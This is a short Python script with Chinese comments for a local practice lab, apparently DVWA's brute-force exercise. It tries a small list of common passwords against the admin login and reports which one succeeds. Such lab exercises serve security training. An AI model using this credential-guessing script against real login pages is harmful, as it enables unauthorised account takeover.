import requests

# 靶场地址（注意你的实际端口，如果是 8080 就是 8080）
url = "http://localhost:8080/vulnerabilities/brute/"
# 默认的 Cookie 保持登录状态（你在浏览器 F12 的 Network 里能看到你的 Cookie）
cookie = {"PHPSESSID": "你的_PHPSESSID", "security": "low"}

# 我们准备一个小字典测试
passwords = ["123456", "password", "admin", "letmein", "qwerty"]

for pwd in passwords:
    # 构造请求参数
    params = {"username": "admin", "password": pwd, "Login": "Login"}
    
    # 发送 GET 请求
    res = requests.get(url, params=params, cookies=cookie)
    
    # 如果返回的网页里没有 "incorrect" 这个词，说明猜对了！
    if "incorrect" not in res.text:
        print(f"🎉 密码破解成功！密码是: {pwd}")
        break
    else:
        print(f"❌ 尝试失败: {pwd}")